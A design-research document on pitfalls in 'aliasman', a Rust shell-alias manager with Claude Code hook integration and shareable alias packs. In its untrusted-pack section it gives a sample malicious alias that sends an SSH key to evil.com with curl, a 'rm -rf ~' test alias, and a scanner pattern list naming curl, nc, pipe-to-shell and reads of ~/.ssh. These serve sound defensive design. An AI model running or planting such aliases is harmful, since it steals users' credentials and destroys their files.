# Domain Pitfalls: aliasman

**Domain:** Rust CLI for shell alias management with Claude Code hook integration + Alias Library (v0.1)
**Researched:** 2026-05-16 (updated from 2026-05-10)
**Confidence:** HIGH (zsh/hook internals verified against official sources; pack pitfalls verified against Oh My Zsh plugin system, npm dependency resolution)

---

## v0.0.1 Foundation Pitfalls

These apply to the core alias management system and remain relevant as the pack layer is added on top.

---

### Pitfall 1: Non-atomic Shell Config File Writes

**What goes wrong:**
Any tool that opens a shell config file (`.zshrc`, `.bashrc`, `~/.aliases`), reads it, modifies it in memory, and writes the whole file back is exposed to a race window. If the process is interrupted — power loss, SIGKILL, disk full — the file is truncated or partially written. The user's shell config is now corrupted and their next terminal open fails silently or with a parse error.

**Why it happens:**
Developers use `std::fs::write()` directly on the target path. This is the single most common mistake in CLI tools that touch dotfiles.

**Consequences:**
- User loses entire `.zshrc` content — aliases, PATH, exports, everything
- Error surfaces only on the next shell open, not during the write, creating a confusing delay
- No backup means no recovery path

**Prevention:**
Use the `tempfile` crate's `NamedTempFile::persist()` pattern exclusively. Write to a temp file in the same directory (same filesystem, so rename is atomic), then call `persist()` which does an atomic `rename(2)`.

```rust
let mut tmp = NamedTempFile::new_in(config_dir)?;
write!(tmp, "{}", new_content)?;
tmp.flush()?;
tmp.persist(target_path)?; // atomic rename, never partial
```

Also take a backup (`~/.aliases.bak`) before any write. Offer `aliasman restore` as a safety command.

**Warning signs:**
- Any use of `std::fs::write(path, content)` directly on `.zshrc` or `~/.aliases`
- Write operations without an intermediate temp file

**Phase that must address it:** Phase 1 — the very first file write operation. No exceptions.

---

### Pitfall 2: First-Run Import Deduplication Failure

**What goes wrong:**
On first run, aliasman scans the user's existing `.zshrc`/`.bashrc` and imports all found `alias foo=...` lines into `~/.aliases`. It also adds `source ~/.aliases` to the shell config. If the user runs `aliasman init` a second time, the import logic does not correctly detect that these aliases already exist in `~/.aliases`. Every alias gets duplicated.

**Consequences:**
- `~/.aliases` fills with hundreds of duplicate lines
- Shell startup slows measurably
- Duplicate definitions create unpredictable which-definition-wins behavior (last-wins in zsh)

**Prevention:**
- Parse `~/.aliases` at the start of every write operation and build a name-keyed map before merging
- Normalize alias values before comparison: strip surrounding quotes, trim whitespace
- Make `aliasman init` idempotent: running it N times must produce the same result as running it once
- Add an integration test that runs `init` twice and asserts `~/.aliases` content is identical both times

**Phase that must address it:** Phase 1 (first-run import).

---

### Pitfall 3: Alias Name Shadows System Commands

**What goes wrong:**
A user aliases `rm` to `rm -i` for safety. Or history-based suggestion auto-suggests `alias ls='ls -la'` without checking whether `ls` is a known system binary. Shadowing `sudo` or `cd` can be terminal.

**Prevention:**
Maintain a hardcoded blocklist of protected names that cannot be used as alias targets without an explicit `--force` flag:
`rm, mv, cp, ln, chmod, chown, kill, sudo, su, cd, source, exec, eval, export, unset, exit, logout, git, ssh, curl, wget, brew`

**Phase that must address it:** Phase 1 (alias CRUD) and Phase 3 (history suggestion).

---

### Pitfall 4: Shell Reload UX — The "Why Isn't My Alias Working?" Problem

**What goes wrong:**
User runs `aliasman add --name gs --command "git status"`. aliasman confirms success. User immediately types `gs` in the same terminal. Gets `command not found: gs`.

**Prevention:**
Always print an actionable reload instruction immediately after any mutation. Consider a shell function wrapper for seamless reload (v2 concern).

**Phase that must address it:** Phase 1. Every mutation command must include the reload hint.

---

### Pitfall 5: zsh Extended History Format Parsing Failures

**What goes wrong:**
When `EXTENDED_HISTORY` is enabled in zsh (default in Oh My Zsh), history lines are prefixed with `: <epoch>:<duration>;`. A naive parser splits on newlines and treats timestamps as commands.

**Prevention:**
- Detect extended format by checking first line pattern `^: [0-9]+:[0-9]+;`
- Use `BufReader` for streaming reads — never load entire history into memory
- Handle invalid UTF-8 with `from_utf8_lossy`

**Phase that must address it:** Phase 3 (history suggestion).

---

### Pitfall 6: Claude Code Hook Token Injection Overload

**What goes wrong:**
If the hook dumps every alias regardless of relevance, a user with 200 aliases injects 2,000-4,000 tokens per session.

**Prevention:**
Filter by cwd context signals. Cap at a hard token budget (500 tokens / ~2000 characters). Log what was injected vs filtered.

**Phase that must address it:** Phase 4 (Claude Code hook).

---

### Pitfall 7: Cross-Shell Alias Syntax Incompatibility

**What goes wrong:**
zsh supports global aliases (`alias -g L='| less'`) — bash does not. If aliasman generates zsh-specific syntax, bash users get parse errors.

**Prevention:**
Scope to POSIX-compatible alias syntax only. No `-g` global aliases. Single-quote all values consistently.

**Phase that must address it:** Phase 1 (alias storage format).

---

### Pitfall 8: History-Suggested Command Injection Risk

**What goes wrong:**
An attacker who can write to the user's history file injects a malicious command that gets suggested as an alias.

**Prevention:**
- Treat all history-derived strings as untrusted input
- Never auto-create an alias from history without explicit user confirmation
- Flag suggestions containing `$(...)`, backticks, `<(...)`, or `| bash`

**Phase that must address it:** Phase 3 (history suggestion).

---

## v0.1 Alias Library Pitfalls

These apply specifically to the shareable alias pack feature being added in v0.1.

---

### Pitfall 9: Untrusted Alias Command Execution (CRITICAL)

**What goes wrong:**
A user installs an alias pack from a third-party source. The pack contains `alias gs='curl http://evil.com/steal?cookie=$HOME/.ssh/id_rsa'`. The alias looks like a harmless `git status` shortcut. When the user types `gs`, their SSH key is exfiltrated.

Aliases execute arbitrary shell code with the user's full privileges — filesystem, environment variables, SSH keys, network access. Unlike a Python package in a venv or a Rust crate in a sandbox, aliases run directly in the interactive shell.

**Consequences:**
- Direct credential theft (SSH keys, API tokens from environment variables)
- Filesystem access (read/write/delete any file the user can access)
- Network access (exfiltrate data, install malware via `curl | bash`)
- Persistent backdoors (aliases survive reboots, run in every new shell session)
- Trust cascade: one compromised pack breaks trust in the entire pack ecosystem

**Prevention:**
1. **Dry-run preview on install**. Before writing any pack alias to the store, display every alias with its full command expansion. Require explicit user confirmation:
   ```
   Pack 'k8s-tools' contains 12 aliases. Review:
   alias kgs='kubectl get pods'
   alias kdel='kubectl delete pod ...'
   ...
   Install all 12 aliases? [y/N]
    ```

2. **Command safety scanner**. Parse each alias command for dangerous patterns and flag them:
    - Command substitution: `$(...)`, backticks
    - Process substitution: `<(...)`, `>(...)`
    - Network access: `curl`, `wget`, `nc`, `netcat`
    - Filesystem access: `rm -rf`, `chmod 777`, `cat ~/.ssh/`
    - Environment variable access: `$HOME`, `$PATH`, `${SECRET}`
    - Pipe to shell: `| bash`, `| sh`, `| zsh`
    - Redirect to sensitive files: `> ~/.bashrc`, `>> ~/.zshrc`

   Flagged aliases require `--force` to install, with the specific risk printed.

3. **Pack source provenance**. Track where each pack came from (URL, git commit, file path). Display provenance in `aliasman pack list`.

4. **Per-alias opt-out**. Allow the user to skip specific aliases during installation:
    ```bash
   aliasman pack install k8s-tools --skip kdel,ksecret
    ```

**Warning signs:**
- Pack install logic that writes aliases without displaying them first
- No command content scanning before installation
- "Install all packs" with no per-alias review

**Detection:**
Attempt to install a pack containing `alias x='rm -rf ~'`. It MUST be blocked or flagged with a clear warning.

**Phase that must address it:** The very first pack installation phase. Security is not retrofittable.

---

### Pitfall 10: Silent Name Collision Overwrites Personal Aliases (CRITICAL)

**What goes wrong:**
A user has a personal alias `alias gs='git status -sb'` (with branch info). They install a "git essentials" pack that also defines `gs='git status'`. The pack install silently overwrites the personal alias. The user loses their custom `-sb` flag without ever being told.

This is the Oh My Zsh plugin problem: when two plugins define the same alias, the last-loaded one wins silently. Users discover this only when their workflow breaks. [Source: ohmyzsh/ohmyzsh wiki, Customization]

**Consequences:**
- User's carefully tuned personal aliases are replaced with pack defaults
- No notification that anything changed
- Trust erosion: user stops using packs because they fear losing customizations

**Prevention:**
1. **Pre-install collision scan**. Before installing any alias from a pack, check if the name already exists. Collect all collisions.

2. **Present collisions to user before proceeding**:
    ```
    3 aliases in 'git-essentials' conflict with existing aliases:
    gs (personal) 'git status -sb'
    gco (personal) 'git checkout -b'

    Resolution strategy?
     [p] Keep personal (default)
     [o] Overwrite with pack version
     [s] Skip conflicting aliases
     [a] Show each conflict individually
    ```

3. **Default to "keep personal"**. Never overwrite a user's personal alias by default.

4. **Track provenance with a `pack` source field**. Extend `AliasSource`:
    ```rust
   pub enum AliasSource {
       User,
       Imported,
       Suggested,
       Pack { name: String, version: String },  // NEW
    }
    ```

5. **Pack uninstall must only remove pack-sourced aliases**. If the user overwrote a pack alias personally, uninstalling the pack must NOT remove the user's version.

**Warning signs:**
- Pack install that calls `store_update_alias` on collision without user prompt
- No `AliasSource::Pack` variant
- Pack uninstall that removes aliases by name without checking `source`

**Detection:**
Create a personal alias `gs='git status -sb'`. Install a pack that defines `gs='git status'`. Verify the personal version is preserved and the user was warned.

**Phase that must address it:** Pack install phase. Collision handling is the core UX of pack installation.

---

### Pitfall 11: Pack-to-Pack Name Collisions — Diamond Dependency (CRITICAL)

**What goes wrong:**
A user installs pack A ("dev-tools") and pack B ("docker-tools"). Both define `dk`. Pack A maps it to `docker`, pack B to `docker-compose`. Install order determines which wins.

This mirrors the npm diamond dependency problem but worse: npm installs both versions side-by-side. Here, there is only one alias namespace — two packs cannot coexist if they share a name. [Source: npm/cli arborist test fixtures]

**Prevention:**
1. **Namespace packs with prefixes**. Each pack gets a unique prefix derived from its name:
    - Pack "docker-tools" → prefix `dk_` → aliases become `dk_run`, `dk_ps`
    - Pack "k8s-tools" → prefix `k8s_` → aliases become `k8s_get`, `k8s_del`

2. **Alternative: pack author declares a namespace in the manifest**:
    ```toml
    [pack]
    name = "docker-tools"
    namespace = "dk"

    [[aliases]]
    name = "run"         # Resolves to dk_run
    command = "docker run"
    ```

3. **If namespaces are not used, enforce collision detection at install time** against ALL installed pack aliases, not just personal ones.

**Warning signs:**
- Pack format with no namespace concept
- Install logic that checks collisions only against personal aliases, not other packs

**Phase that must address it:** Pack format design. The namespace/prefix decision shapes the entire pack data model.

---

### Pitfall 12: Building a Full Package Manager Instead of a Pack Format (CRITICAL)

**What goes wrong:**
The developer starts implementing pack dependencies (pack A requires pack B), version ranges (`^1.2.0`), a central registry, semver resolution, transitive dependency graphs. Six months later, the pack system is a mini-npm with none of npm's edge cases handled.

**Why it happens:**
Feature creep from analogy. "npm has dependencies, so packs should too." The developer confuses distribution layer complexity with content layer simplicity.

**Consequences:**
- 10x implementation effort for unrequested features
- Dependency resolution bugs that are nearly impossible to test
- Registry infrastructure needing hosting, maintenance, security audits
- Users who wanted to share 5 aliases now need to understand semver and dependency trees

**Prevention:**
1. **Simplest possible pack format**: a single TOML file shareable via any channel (email, git, URL, paste bin). No registry, no dependencies, no version resolution.

    ```toml
    [pack]
    name = "k8s-tools"
    version = "1.0.0"
    description = "Kubernetes alias shortcuts"
    author = "alice@example.com"

    [[aliases]]
    name = "kget"
    command = "kubectl get pods"
    description = "List all pods"
    tags = ["k8s", "kubectl"]
    ```

2. **Install from file or URL only**:
    ```bash
    aliasman pack install ./k8s-tools.toml
    aliasman pack install https://example.com/k8s-tools.toml
    ```

3. **NO pack-to-pack dependencies in v0.1**. "Recommended" packs are suggestions, not enforced dependencies.

4. **NO central registry in v0.1**. Built-in curated packs ship with the binary. Community packs are shared manually.

5. **Version is advisory, not enforced**. No version range resolution.

**Warning signs:**
- A `dependencies` field in the pack manifest
- Semver parsing or version range resolution code
- A registry client or API layer
- `aliasman pack search` before basic install works

**Phase that must address it:** Pack format design. The manifest schema is the boundary between "simple pack format" and "package manager."

---

### Pitfall 13: Pack Update Silently Changes Alias Commands

**What goes wrong:**
A user has pack "git-essentials" v1.0 with `alias gco='git checkout'`. Pack author releases v1.1 changing it to `alias gco='git switch -c'`. User runs `aliasman pack update`. Their `gco` now behaves differently. They muscle-memory `gco old-branch` and get an error.

**Consequences:**
- Muscle-memory shortcuts break silently
- No diff of what changed
- No rollback path

**Prevention:**
1. **Pre-update diff**:
    ```
    Updating 'git-essentials' v1.0 → v1.1:
    gco: 'git checkout'       → 'git switch -c'
    gp:  'git push'           → 'git push --force-with-lease'
    (10 aliases unchanged)
    Apply changes? [y/N]
    ```

2. **Pack update backup**. Save previous values. Support `aliasman pack rollback <pack-name>`.

3. **Semantic change detection**. Flag aliases where the base command changed vs only flags changed.

4. **Opt-in auto-update disabled by default**.

**Phase that must address it:** Pack update phase. Diff + confirm before any overwrite.

---

### Pitfall 14: Pack Format Migration Breaks Old Packs

**What goes wrong:**
aliasman v0.1 uses pack format v1. In v0.2, the schema changes. Users with v0.2 cannot install v0.1 packs and vice versa.

**Prevention:**
1. **Embed `format_version` in every pack manifest**:
    ```toml
    [pack]
    format_version = "1"
    name = "k8s-tools"
    ```

2. **Read side must be forward-compatible**. Lower version → apply migration logic. Higher version → refuse with clear error.

3. **Keep a migration table in code**:
    ```rust
    fn migrate_pack(raw: &str, from: u32, to: u32) -> Result<String, String> {
        match (from, to) {
            (1, 2) => add_namespace_field(raw),
            _ => Err("No migration path".into()),
        }
    }
    ```

4. **Built-in packs must match the binary's format version**.

**Phase that must address it:** Pack format design. `format_version` must be in the initial schema.

---

### Pitfall 15: Pack Uninstall Removes User-Modified Aliases

**What goes wrong:**
User installs a pack, modifies one of its aliases (`aliasman update --name gs --command "git status -sb"`), then uninstalls the pack. The uninstall removes `gs` because it was originally from the pack, even though the user customized it.

**Prevention:**
1. **Track `modified_by_user` flag**. When user updates a pack-sourced alias, set the flag. On uninstall, skip flagged aliases with a warning.
    ```
    3 aliases from 'git-essentials' were modified and will be kept:
    gs → 'git status -sb' (modified)
    8 unmodified aliases will be removed.
    Uninstall? [y/N]
    ```

2. **Always confirm uninstall with a summary**.

**Phase that must address it:** Pack uninstall phase. Modification tracking must be wired into `update` before uninstall is implemented.

---

### Pitfall 16: Pack Install Corrupts State on Partial Failure

**What goes wrong:**
A pack has 20 aliases. Install iterates through them one by one. After 12, the 13th fails validation. The first 12 are already committed. User has a partially-installed pack with no rollback.

**Prevention:**
1. **Two-phase install**: Phase 1 validates every alias (name syntax, protected names, collisions). Phase 2 applies all if Phase 1 passes and user confirms.

2. **Build complete new store in memory first**. Only write to disk if ALL aliases pass.

3. **On any failure, report ALL errors at once**. Zero aliases from the pack are added.

**Phase that must address it:** Pack install phase. Two-phase validate-then-apply is the default design.

---

### Pitfall 17: Built-in Packs Cannot Be Updated Independently

**What goes wrong:**
Built-in packs are embedded via `include_str!` in the binary. A bug in a built-in pack alias requires a full binary release to fix. Users cannot customize built-in packs locally.

**Prevention:**
1. **Ship built-in packs as files in `~/.config/aliasman/builtin_packs/`** during `aliasman init`.
2. **Allow user override** via `~/.config/aliasman/custom_packs/`.
3. **Provide `aliasman pack edit <name>`** to extract and modify any pack.

**Phase that must address it:** Built-in packs phase. Decide embedded vs. file-based early.

---

### Pitfall 18: Tag Inconsistency Across Packs Breaks Hook Filtering

**What goes wrong:**
Pack A tags kubectl aliases as `["k8s", "kubectl"]`. Pack B uses `["kubernetes"]`. The Claude hook's tag-based filtering cannot reliably match.

**Prevention:**
1. **Define a recommended tag taxonomy** for pack authors.
2. **Include a `tools` field in pack manifest** for structured matching:
    ```toml
    [pack]
    tools = ["kubectl", "helm"]
    ```
3. **Fallback: parse the `command` field** to extract the base binary for hook matching.

**Phase that must address it:** Pack format design. Tag conventions and `tools` field belong in the initial manifest schema.

---

### Pitfall 19: Pack File URL Fetch Fails Silently

**What goes wrong:**
`aliasman pack install https://example.com/pack.toml` returns a 404 or times out. The error message is generic: "Failed to install pack."

**Prevention:**
- Specific error types: `HttpError(404)`, `TimeoutError`, `TlsError`
- Print the exact URL being fetched
- Validate downloaded content is valid TOML before parsing

**Phase that must address it:** Pack install from URL phase.

---

### Pitfall 20: Installed Pack Metadata Duplicates Alias Data

**What goes wrong:**
Pack metadata is stored in two places: `AliasSource::Pack` on each record AND a separate `installed_packs.json`. The two sources diverge over time.

**Prevention:**
- **Single source of truth**: derive pack state from `AliasSource::Pack` on each alias. No separate manifest file.
- `aliasman pack list` groups aliases by source. No caching needed at <1000 aliases.

**Phase that must address it:** Pack metadata design. Avoid dual storage from the start.

---

### Pitfall 21: Pack Authoring Has No Validation

**What goes wrong:**
A pack author creates a `pack.toml` with 20 aliases. A coworker's install fails due to a typo. The author has no way to validate locally.

**Prevention:**
Provide `aliasman pack validate ./pack.toml`:
```
Validating ./k8s-tools.toml...
✓ 18 aliases valid
✗ Alias 'k-get ': invalid name (trailing space)
✗ Alias 'krm': command contains 'rm -rf' — flagged as dangerous
2 issues found.
```

**Phase that must address it:** Pack authoring tools phase. Ship alongside pack install.

---

## Phase-Specific Warnings

| Phase Topic | Likely Pitfall | Mitigation |
|-------------|---------------|------------|
| **v0.0.1: File write** | Non-atomic write corrupts `~/.aliases` | `NamedTempFile::persist()` from day one |
| **v0.0.1: First-run import** | Deduplication failure on second run | Idempotency test: run init twice |
| **v0.0.1: Shell reload** | Users think tool is broken | Mandatory reload hint on every mutation |
| **v0.0.1: Name validation** | Shadowing system commands | Blocklist + `--force` flag |
| **v0.0.1: Cross-shell** | Bash users get parse errors | POSIX-only alias format |
| **v0.0.1: History parsing** | Binary chars, extended format | Streaming BufReader, lossy UTF-8 |
| **v0.0.1: History security** | Injection via poisoned history | Explicit confirmation before auto-create |
| **v0.0.1: Hook** | Token overload on every session | Directory-aware filtering, 500-token cap |
| **v0.1: Pack format design** | No `format_version`, no namespace, no `tools` | Include all three in initial schema |
| **v0.1: Pack install** | Silent overwrite of personal aliases | Pre-install collision scan + user prompt |
| **v0.1: Pack install** | Untrusted commands executed without review | Mandatory dry-run + command safety scanner |
| **v0.1: Pack install** | Partial install on validation failure | Two-phase: validate all, then apply all |
| **v0.1: Pack install** | Package manager scope creep | No dependencies, no registry, no semver in v0.1 |
| **v0.1: Pack update** | Silent command changes break workflows | Pre-update diff + confirm + rollback |
| **v0.1: Pack uninstall** | Removes user-modified aliases | Track `modified_by_user`, skip on uninstall |
| **v0.1: Pack format** | Migration breaks old packs | `format_version` field + migration table |
| **v0.1: Built-in packs** | Cannot be updated independently | Ship as files in config dir |
| **v0.1: Hook + packs** | Tag fragmentation breaks filtering | Tag taxonomy + `tools` field + command fallback |
| **v0.1: Pack authoring** | No validation before sharing | `aliasman pack validate` command |

---

## Summary of Priority

| Priority | Pitfall | Impact | Phase |
|----------|---------|--------|-------|
| **P0** | Untrusted command execution (#9) | Security vulnerability | Pack install |
| **P0** | Silent name collision overwrite (#10) | Data loss | Pack install |
| **P0** | Building a package manager (#12) | Scope creep, wasted effort | Pack format design |
| **P0** | Non-atomic writes (#1) | Data corruption | Foundation (v0.0.1) |
| **P1** | Pack-to-pack collisions (#11) | Broken coexistence | Pack format design |
| **P1** | Partial install on failure (#16) | Inconsistent state | Pack install |
| **P1** | Pack update breaks workflows (#13) | User frustration | Pack update |
| **P1** | Deduplication failure (#2) | File bloat | Foundation (v0.0.1) |
| **P2** | Format migration breaks packs (#14) | Ecosystem fragmentation | Pack format design |
| **P2** | Uninstall removes modified aliases (#15) | Data loss | Pack uninstall |
| **P2** | Built-in packs rigidity (#17) | Distribution limitation | Built-in packs |
| **P2** | Tag inconsistency (#18) | Hook filtering degrades | Pack format design |
| **P2** | Protected name shadowing (#3) | Dangerous overrides | Foundation (v0.0.1) |
| **P3** | URL fetch failures (#19) | UX friction | Pack install from URL |
| **P3** | Dual source of truth (#20) | State drift | Pack metadata |
| **P3** | No pack validation (#21) | Bad packs circulate | Pack authoring |
| **P3** | Shell reload UX (#4) | First-use confusion | Foundation (v0.0.1) |
| **P3** | History parsing failures (#5) | Garbage suggestions | Foundation (v0.0.1) |
| **P3** | Hook token overload (#6) | Token waste | Foundation (v0.0.1) |
| **P3** | Cross-shell incompatibility (#7) | Bash user errors | Foundation (v0.0.1) |
| **P3** | History injection (#8) | Security (low threat) | Foundation (v0.0.1) |

---

## Sources

- zsh official documentation, alias section 6.8: https://zsh.sourceforge.io/Doc/Release/Shell-Grammar
- zsh history options (EXTENDED_HISTORY): https://zsh.sourceforge.io/Doc/Release/Options
- tempfile crate (`NamedTempFile::persist`): Context7 /stebalien/tempfile — HIGH confidence
- Claude Code hooks (SessionStart, token budget, auto-compaction): Context7 /disler/claude-code-hooks-mastery — HIGH confidence
- Oh My Zsh plugin override and loading order: https://github.com/ohmyzsh/ohmyzsh/wiki/Customization — HIGH confidence
- npm peer dependency conflict patterns: https://github.com/npm/cli (arborist test fixtures) — HIGH confidence
- Existing aliasman codebase: `src/store.rs`, `src/validation.rs`, `src/model.rs` — direct inspection, HIGH confidence
- Chezmoi/stow dotfile management patterns: community knowledge, MEDIUM confidence
- Shell security best practices for untrusted command execution: accumulated engineering knowledge, MEDIUM confidence
